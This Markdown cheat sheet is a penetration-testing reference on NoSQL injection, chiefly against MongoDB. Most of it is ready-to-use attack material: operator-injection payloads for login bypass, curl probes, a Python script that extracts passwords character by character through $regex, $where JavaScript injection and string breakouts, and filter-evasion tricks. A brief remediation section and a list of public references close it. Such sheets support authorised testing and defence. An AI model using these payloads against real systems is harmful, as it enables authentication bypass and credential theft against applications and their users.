# NoSQL Injection

NoSQL injection abuses applications that build NoSQL queries (MongoDB, CouchDB, Redis, Elasticsearch, etc.) from unsanitized input. The two dominant flavors are **operator injection** (smuggling query operators like `$ne`, `$gt`, `$regex` into the query object) and **syntax/JavaScript injection** (breaking out of the query string or injecting server-side JS via `$where`). Most impactful against MongoDB. Leads to auth bypass, data extraction, and sometimes RCE.

---

## Detection

```text
- JSON bodies with user/pass, filters, search, ids that hit a document DB
- Login forms, search, filtering/sorting params, "find by" endpoints
- Error messages mentioning MongoError, BSON, casting, CastError, $-operators
```

Quick probes (watch for different behavior / errors / bypass):

```text
'                       (syntax error?)
"
\
{"$gt":""}
{"$ne":null}
[$ne]=1                 (urlencoded operator injection)
{"$where":"sleep(2000)"}   (timing)
```

```bash
# JSON operator injection
curl -s https://T/login -H 'Content-Type: application/json' \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
# URL-encoded operator injection (param[$ne]=x style)
curl -s 'https://T/login' --data 'username[$ne]=x&password[$ne]=x'
```

---

## Exploitation

### 1. Authentication bypass (operator injection)

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "doesnotexist"}, "password": {"$ne": "x"}}
{"username": "admin", "password": {"$ne": "x"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": "x"}}
{"username": {"$in": ["admin","root"]}, "password": {"$ne": null}}
```

Form / query-string equivalents (PHP/Express parse `a[$ne]=` into an object):

```
username[$ne]=x&password[$ne]=x
username[$regex]=admin&password[$ne]=x
username=admin&password[$gt]=
```

### 2. Data extraction via `$regex` (blind, char-by-char)

When login returns a boolean oracle, brute the password with regex anchors:

```json
{"username":"admin","password":{"$regex":"^a"}}     # true if pass starts with 'a'
{"username":"admin","password":{"$regex":"^ad"}}
{"username":"admin","password":{"$regex":"^admin123$"}}
```

Automate the alphabet sweep:

```python
import requests, string
url="https://T/login"; found=""
charset = string.ascii_letters + string.digits + "_@!.-"
while True:
    for c in charset:
        r = requests.post(url, json={"username":"admin",
              "password":{"$regex":f"^{found}{c}"}})
        if "Welcome" in r.text or r.status_code==302:
            found += c; print(found); break
    else:
        break
```

### 3. Server-side JavaScript injection (`$where`, mapReduce)

If the app uses `$where`/`mapReduce`/`group` with input, inject JS:

```json
{"$where": "this.password == this.username"}
{"$where": "sleep(5000)"}                       # time-based oracle
{"$where": "this.username=='admin' && this.password.match(/^a/)"}
```

String-context breakout for `$where` built by concatenation:

```
admin' || '1'=='1
';return true;var x='
';sleep(5000);'
0;return true
'; return this.password[0]=='a'; var dummy='
```

### 4. Operator injection in query strings (Express/qs, PHP)

```
GET /search?q[$ne]=x
GET /products?category[$regex]=.*&category[$options]=i
GET /api/users?role[$ne]=user            (return non-user accounts -> admins)
```

### 5. Extract via JSON type juggling / `$gt` enumeration

```json
{"password":{"$gt":"a"}}   {"password":{"$gt":"m"}}   # binary-search the value
```

---

## Other NoSQL backends

```text
# CouchDB (HTTP API) — Mango selectors
{"selector":{"password":{"$gt":null}}}
# Elasticsearch — query DSL / Lucene injection
q=*:*    q=name:admin OR 1=1    {"query":{"bool":{"must":{"match_all":{}}}}}
# Redis (via gopher SSRF or injected commands) — see ssrf.md
# GraphQL passing raw filters to Mongo — see api/graphql-api-attacks.md
```

---

## WAF / filter bypasses

```text
- $ stripped at top level -> nest deeper or use bracket form a[$ne]=
- Keys sanitized but values not -> use {"$function":...} (Mongo 4.4+ aggregation $function)
- JSON blocked -> use the [param][$op]=val form (qs/body-parser auto-objectifies)
- Quote filtering in $where -> use String.fromCharCode, /regex/ literals, no-quote logic
- Case: $WHERE not valid, but operator names are case-sensitive -> use exact $ne/$gt
- Unicode / extra whitespace inside JSON keys
```

```json
{"$where":"this.x==String.fromCharCode(97)"}
{"username":{"$regex":"admin","$options":"i"}}
```

---

## Tooling

| Tool | Use |
|------|-----|
| **NoSQLMap** | Automated MongoDB/CouchDB injection, auth bypass, data dump |
| **nosqli** (Go) | Detect & exploit NoSQL injection |
| **Burp Suite** | Manual JSON/operator tampering, regex extraction loops (Intruder) |
| **mongo-shell / curl** | Direct verification once injectable |

```bash
nosqlmap                                  # interactive
nosqli -t https://T/login -m POST -p username,password
```

---

## Remediation

- Validate/cast input types: reject objects where a string is expected (a username must be a string, not `{"$ne":...}`).
- Never build queries from raw input; use parameterized query objects with typed fields.
- Disable server-side JS (`$where`, `mapReduce`) or never feed it user input (`--noscripting`).
- Sanitize keys starting with `$` / containing `.` (e.g. `express-mongo-sanitize`, `mongoose` schemas with strict typing).
- Enforce schema validation at the DB layer.

---

## Cheatsheet

```text
# Auth bypass (JSON)
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":"admin","password":{"$gt":""}}
# Form/query form
username[$ne]=x&password[$ne]=x
?role[$ne]=user
# Regex extraction
{"username":"admin","password":{"$regex":"^a"}}
# $where JS
{"$where":"sleep(5000)"}   {"$where":"this.user=='admin'&&this.pass.match(/^a/)"}
# String breakout for $where
admin' || '1'=='1     ';return true;var x='
# Mongo $function (4.4+)
{"$where":"function(){return true}"}
```

---

## References

- PortSwigger — NoSQL injection: https://portswigger.net/web-security/nosql-injection
- PayloadsAllTheThings — NoSQL Injection: https://swisskyrepo.github.io/PayloadsAllTheThings/NoSQL%20Injection/
- HackTricks — NoSQL injection: https://hacktricks.wiki/en/pentesting-web/nosql-injection.html
- OWASP Testing Guide — Testing for NoSQL Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
- NoSQLMap: https://github.com/codingo/NoSQLMap
